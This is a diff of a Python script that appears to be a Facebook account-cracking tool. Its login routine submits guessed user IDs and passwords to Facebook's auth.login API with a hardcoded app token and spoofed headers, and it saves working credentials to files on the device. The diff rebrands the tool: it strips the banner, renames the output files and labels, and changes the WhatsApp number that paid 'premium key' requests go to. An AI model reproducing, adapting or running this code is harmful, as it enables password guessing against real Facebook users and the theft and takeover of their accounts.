@@ -48,22 +48,7 @@ def ua():
 logo = (f"""
                                                                                     
                                                                                     
-WWWWWWWW                           WWWWWWWW                 NNNNNNNN        NNNNNNNN
-W::::::W                           W::::::W                 N:::::::N       N::::::N
-W::::::W                           W::::::W                 N::::::::N      N::::::N
-W::::::W                           W::::::W                 N:::::::::N     N::::::N
- W:::::W           WWWWW           W:::::W                  N::::::::::N    N::::::N
-  W:::::W         W:::::W         W:::::W                   N:::::::::::N   N::::::N
-   W:::::W       W:::::::W       W:::::W                    N:::::::N::::N  N::::::N
-    W:::::W     W:::::::::W     W:::::W     --------------- N::::::N N::::N N::::::N
-     W:::::W   W:::::W:::::W   W:::::W      -:::::::::::::- N::::::N  N::::N:::::::N
-      W:::::W W:::::W W:::::W W:::::W       --------------- N::::::N   N:::::::::::N
-       W:::::W:::::W   W:::::W:::::W                        N::::::N    N::::::::::N
-        W:::::::::W     W:::::::::W                         N::::::N     N:::::::::N
-         W:::::::W       W:::::::W                          N::::::N      N::::::::N
-          W:::::W         W:::::W                           N::::::N       N:::::::N
-           W:::W           W:::W                            N::::::N        N::::::N
-            WWW             WWW                             NNNNNNNN         NNNNNNN
+
                                                                                     
 \x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
 \033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  NADIMXWASU  
@@ -126,8 +111,8 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r{G}NADEEM OKY  {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/NADEEM-OLD-OK","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r{G}LOVE OKY  {A}➤ {G}{uid} {A}•{G} {pw}")
+                open("/sdcard/LOVE-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
@@ -136,8 +121,8 @@ def login(uid):
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in str(rp):
-                print(f"\r\r{G}NADEEM-DONE {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r{G}LOVE-DONE {A}➤ {G}{uid} {A}•{G} {pw}")
+                open("/sdcard/LOVE-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -179,7 +164,7 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20NADEEM,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+919910632063?text=' + tks)
+		os.system('am start https://wa.me/+919996030575?text=' + tks)
 		Subscraption()        
 Subscraption()
 #----------------------------[CODE/END]-----------------------------------#
